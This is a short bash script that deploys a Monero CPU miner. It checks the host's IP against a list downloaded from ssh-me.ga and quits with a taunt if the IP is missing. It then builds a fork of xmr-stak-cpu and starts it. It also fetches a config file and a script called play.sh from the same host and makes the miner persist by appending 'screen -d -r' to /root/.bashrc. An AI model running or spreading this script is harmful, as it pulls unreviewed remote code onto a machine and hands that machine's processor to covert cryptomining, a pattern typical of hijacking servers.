
myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;

flag=0

wget --quiet -O ls.txt ssh-me.ga/ls.txt

ls="ls.txt"

lines=`cat $ls`

for line in $lines; do
#        echo "$line"
        if [ "$line" = "$myip" ]
        then
                flag=1
        fi

done


if [ $flag -eq 0 ]
then
   echo  "Mabok ya !!!!!"
   exit 1
fi
sudo apt-get update
sudo apt-get -y upgrade
sudo apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen git  nano
git clone https://github.com/iswant/xmr-stak-cpu.git
cd xmr-stak-cpu
cmake .
make install
cd bin/
chmod +x xmr-stak-cpu
./xmr-stak-cpu
sudo sysctl -w vm.nr_hugepages=128
rm config.txt
wget ssh-me.ga/a./config.txt
chmod +x xmr-stak-cpu
wget ssh-me.ga/a./play.sh
echo -e "vm.nr_hugepages=128" >> /etc/sysctl.conf
echo -e "screen -d -r" >> /root/.bashrc
screen
